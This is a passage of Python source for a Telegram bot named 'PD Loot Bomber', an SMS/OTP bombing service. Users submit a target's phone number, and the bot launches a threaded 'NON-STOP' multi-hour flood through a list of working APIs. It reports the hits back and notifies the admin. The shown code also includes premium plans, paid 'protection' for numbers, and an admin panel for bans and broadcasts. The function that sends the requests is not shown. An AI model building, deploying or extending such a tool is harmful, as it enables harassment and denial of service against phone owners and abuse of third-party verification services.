        premium_users = len([u for u in users if u[5] != 'FREE' and u[6] and datetime.fromisoformat(u[6]) > datetime.now()])
        active_users = len([u for u in users if u[7] == 0])
        
        protected_numbers = get_all_protected_numbers()
        active_protected = len([p for p in protected_numbers if datetime.fromisoformat(p[3]) > datetime.now()])
        
        active_bombing = get_active_bombing_sessions()
        
        stats_text = f"""
📊 <b>ADMIN STATISTICS</b>

👥 Total Users: {total_users}
💎 Premium Users: {premium_users}
✅ Active Users: {active_users}
🚫 Banned Users: {total_users - active_users}

🛡️ Protected Numbers: {active_protected}
💣 Total Bombs: {sum(u[4] for u in users)}
🔥 Active Bombing Sessions: {len(active_bombing)}
        """
        
        query.edit_message_text(
            stats_text,
            parse_mode='HTML',
            reply_markup=admin_panel_keyboard()
        )
    
    elif data == "admin_user_status":
        query.edit_message_text(
            "🔍 <b>Check User Status</b>\n\n"
            "Send user ID to check status:",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Back to Admin", callback_data="back_to_main")]
            ])
        )
        context.user_data["admin_waiting_user_id"] = True
    
    elif data == "admin_ban_user":
        query.edit_message_text(
            "🚫 <b>Ban User</b>\n\n"
            "Send user ID to ban:",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Back to Admin", callback_data="back_to_main")]
            ])
        )
        context.user_data["admin_waiting_ban_user"] = True
    
    elif data == "admin_unban_user":
        query.edit_message_text(
            "✅ <b>Unban User</b>\n\n"
            "Send user ID to unban:",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Back to Admin", callback_data="back_to_main")]
            ])
        )
        context.user_data["admin_waiting_unban_user"] = True
    
    elif data == "admin_protect_number":
        query.edit_message_text(
            "🛡️ <b>Protect Number</b>\n\n"
            "Send phone number to protect:",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Back to Admin", callback_data="back_to_main")]
            ])
        )
        context.user_data["admin_waiting_protect_number"] = True
    
    elif data == "admin_broadcast":
        query.edit_message_text(
            "📢 <b>Broadcast Message</b>\n\n"
            "Send message to broadcast to all users:",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Back to Admin", callback_data="back_to_main")]
            ])
        )
        context.user_data["admin_waiting_broadcast"] = True
    
    elif data == "admin_active_bombs":
        active_sessions = get_active_bombing_sessions()
        
        if active_sessions:
            bombs_text = "🔥 <b>ACTIVE BOMBING SESSIONS</b>\n\n"
            for session in active_sessions:
                user_id = session[1]
                phone = session[2]
                start_time = datetime.fromisoformat(session[3])
                duration = datetime.now() - start_time
                hours = int(duration.total_seconds() // 3600)
                minutes = int((duration.total_seconds() % 3600) // 60)
                
                bombs_text += f"👤 User: {user_id}\n"
                bombs_text += f"📱 Target: {phone}\n"
                bombs_text += f"⏰ Running: {hours}h {minutes}m\n"
                bombs_text += f"📊 Requests: {session[5]}\n"
                bombs_text += f"💥 Success: {session[6]}\n"
                bombs_text += "─" * 20 + "\n"
        else:
            bombs_text = "❌ <b>No active bombing sessions</b>"
        
        query.edit_message_text(
            bombs_text,
            parse_mode='HTML',
            reply_markup=admin_panel_keyboard()
        )

# Handle messages
def handle_message(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    message_text = update.message.text
    
    # Admin functionality
    if str(user_id) == ADMIN_CHAT_ID:
        # Check user status
        if context.user_data.get("admin_waiting_user_id"):
            try:
                target_user_id = int(message_text)
                user = get_user(target_user_id)
                if user:
                    is_premium = is_premium_user(target_user_id)
                    plan_expiry = user[6][:10] if user[6] else "No expiry"
                    status_text = f"""
👤 <b>User Info</b>

🆔 ID: {user[0]}
👤 Name: {user[3]}
📅 Joined: {user[2][:10]}
💎 Plan: {'PREMIUM' if is_premium else 'FREE'}
📅 Expiry: {plan_expiry}
💣 Bombs: {user[4]}
🚫 Status: {'BANNED' if user[7] else 'ACTIVE'}
                    """
                else:
                    status_text = "❌ User not found."
                
                update.message.reply_text(status_text, parse_mode='HTML', reply_markup=admin_panel_keyboard())
                context.user_data["admin_waiting_user_id"] = False
            except:
                update.message.reply_text("❌ Invalid user ID", reply_markup=admin_panel_keyboard())
        
        # Ban user
        elif context.user_data.get("admin_waiting_ban_user"):
            try:
                target_user_id = int(message_text)
                ban_user(target_user_id)
                update.message.reply_text(f"✅ User {target_user_id} banned successfully!", reply_markup=admin_panel_keyboard())
                context.user_data["admin_waiting_ban_user"] = False
            except:
                update.message.reply_text("❌ Invalid user ID", reply_markup=admin_panel_keyboard())
        
        # Unban user
        elif context.user_data.get("admin_waiting_unban_user"):
            try:
                target_user_id = int(message_text)
                unban_user(target_user_id)
                update.message.reply_text(f"✅ User {target_user_id} unbanned successfully!", reply_markup=admin_panel_keyboard())
                context.user_data["admin_waiting_unban_user"] = False
            except:
                update.message.reply_text("❌ Invalid user ID", reply_markup=admin_panel_keyboard())
        
        # Protect number
        elif context.user_data.get("admin_waiting_protect_number"):
            phone = message_text.strip()
            if phone.isdigit() and len(phone) == 10:
                add_protected_number(phone, user_id, "ADMIN_PERMANENT", 9999)
                update.message.reply_text(
                    f"✅ <b>Number Protected Successfully!</b>\n\n"
                    f"📱 Phone: <code>{phone}</code>\n"
                    f"⏰ Duration: Permanent\n"
                    f"🛡️ Type: Admin Protection",
                    parse_mode='HTML',
                    reply_markup=admin_panel_keyboard()
                )
                context.user_data["admin_waiting_protect_number"] = False
            else:
                update.message.reply_text("❌ Invalid phone number. Please enter 10 digits.", reply_markup=admin_panel_keyboard())
        
        # Broadcast message
        elif context.user_data.get("admin_waiting_broadcast"):
            users = get_all_users()
            success_count = 0
            for user in users:
                if user[7] == 0:  # Only active users
                    try:
                        context.bot.send_message(
                            chat_id=user[0],
                            text=f"📢 <b>Announcement from Admin</b>\n\n{message_text}",
                            parse_mode='HTML'
                        )
                        success_count += 1
                        time.sleep(0.1)
                    except:
                        pass
            
            update.message.reply_text(f"✅ Broadcast sent to {success_count} users!", reply_markup=admin_panel_keyboard())
            context.user_data["admin_waiting_broadcast"] = False
        
        return
    
    # Regular user functionality
    if context.user_data.get("waiting_for_phone"):
        phone = message_text.strip()
        
        # Validate phone number
        if not phone.isdigit() or len(phone) != 10:
            update.message.reply_text(
                "❌ <b>Invalid phone number!</b>\n"
                "Please enter 10 digits only.\n"
                "Example: <code>9876543210</code>",
                parse_mode='HTML',
                reply_markup=back_button_keyboard()
            )
            return
        
        # Check if number is protected
        if is_number_protected(phone):
            update.message.reply_text(
                "🛡️ <b>This number is protected!</b>\n\n"
                "This phone number cannot be bombed as it is under protection.",
                parse_mode='HTML',
                reply_markup=main_menu_keyboard()
            )
            context.user_data["waiting_for_phone"] = False
            return
        
        # Check protected numbers
        if phone in PROTECTED_NUMBERS:
            update.message.reply_text(
                "🚫 <b>This number is protected!</b>",
                parse_mode='HTML',
                reply_markup=main_menu_keyboard()
            )
            context.user_data["waiting_for_phone"] = False
            return
        
        duration = context.user_data.get("bomb_duration", 3)
        
        # Create bombing session in database
        session_id = create_bombing_session(user_id, phone, duration)
        
        # Send bombing started message
        bombing_msg = update.message.reply_text(
            f"💣 <b>NON-STOP BOMBING STARTING...</b> 💣\n\n"
            f"📱 Target: <code>{phone}</code>\n"
            f"⏰ Duration: <b>{duration} Hours NON-STOP</b>\n"
            f"🚀 APIs: <b>{len(WORKING_APIS)} Working</b>\n"
            f"🔥 Mode: <b>CONTINUOUS ATTACK</b>\n\n"
            f"🛑 Click STOP to cancel",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bombing")],
                [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]
            ])
        )
        
        # Initialize bombing session
        bombing_sessions[user_id] = {
            "active": True,
            "phone": phone,
            "start_time": time.time(),
            "session_id": session_id
        }
        
        # Start NON-STOP bombing in separate thread
        def bombing_thread():
            total_requests, total_success = bomb_phone_nonstop(
                phone, user_id, context, bombing_msg.message_id, duration, session_id
            )
            
            # Clean up session
            if user_id in bombing_sessions:
                del bombing_sessions[user_id]
            
            # Update bomb count
            increment_bomb_count(user_id)
            
            # Calculate final statistics
            total_time = duration * 3600
            rpm = int((total_requests / total_time) * 60) if total_time > 0 else 0
            
            # Send final results
            result_text = f"""
✅ <b>NON-STOP BOMBING COMPLETED!</b> ✅

📱 Target: <code>{phone}</code>
⏰ Duration: {duration} Hours
📊 Total Requests: <b>{total_requests}</b>
💥 Successful Hits: <b>{total_success}</b>
🚀 Average Speed: <b>{rpm} RPM</b>
🔥 APIs Used: {len(WORKING_APIS)}

🎯 <i>Target successfully bombed NON-STOP!</i>

💣 <b>Ready for next target?</b>
            """
            
            try:
                context.bot.edit_message_text(
                    chat_id=user_id,
                    message_id=bombing_msg.message_id,
                    text=result_text,
                    parse_mode='HTML',
                    reply_markup=main_menu_keyboard()
                )
            except:
                try:
                    context.bot.send_message(
                        chat_id=user_id,
                        text=result_text,
                        parse_mode='HTML',
                        reply_markup=main_menu_keyboard()
                    )
                except:
                    pass
            
            # Notify admin
            admin_text = f"""
👁️ <b>Bombing Report - NON-STOP</b>

👤 User: {update.effective_user.first_name}
🆔 ID: {user_id}
📱 Target: {phone}
⏰ Duration: {duration} Hours
📊 Requests: {total_requests}
💥 Success: {total_success} hits
🚀 Speed: {rpm} RPM
            """
            
            try:
                context.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=admin_text,
                    parse_mode='HTML'
                )
            except Exception as e:
                logger.error(f"Failed to notify admin: {e}")
        
        # Start bombing thread
        thread = threading.Thread(target=bombing_thread)
        thread.daemon = True
        thread.start()
        
        # Track active thread
        active_bombing_threads[user_id] = thread
        
        context.user_data["waiting_for_phone"] = False

    else:
        update.message.reply_text(
            "🤖 Use /start to begin NON-STOP bombing!",
            parse_mode='HTML',
            reply_markup=main_menu_keyboard()
        )

# Help command
def help_command(update: Update, context: CallbackContext):
    update.message.reply_text(
        "💣 <b>PD Loot Bomber - NON-STOP System</b>\n\n"
        "Use /start to begin continuous bombing!",
        parse_mode='HTML',
        reply_markup=main_menu_keyboard()
    )

# Error handler
def error_handler(update: Update, context: CallbackContext):
    logger.error(f"Update {update} caused error {context.error}")

# Main function
def main():
    init_db()
    
    try:
        updater = Updater(BOT_TOKEN, use_context=True)
        dp = updater.dispatcher
        
        dp.add_handler(CommandHandler("start", start))
        dp.add_handler(CommandHandler("help", help_command))
        dp.add_handler(CallbackQueryHandler(button_handler))
        dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
        dp.add_error_handler(error_handler)
        
        print("🤖 PD Loot Bomber Bot is running...")
        print(f"📢 Channel: {CHANNEL_USERNAME}")
        print(f"🔥 Working APIs: {len(WORKING_APIS)}")
        print("💎 NON-STOP System: ACTIVE")
        print("🛡️ Number Protection: ACTIVE")
        print("👑 Admin Panel: ACTIVE")
        print("✅ Ready for NON-STOP bombing!")
        
        updater.start_polling()
        updater.idle()
        
    except Exception as e:
        logger.error(f"Bot startup failed: {e}")

if __name__ == "__main__":
    main()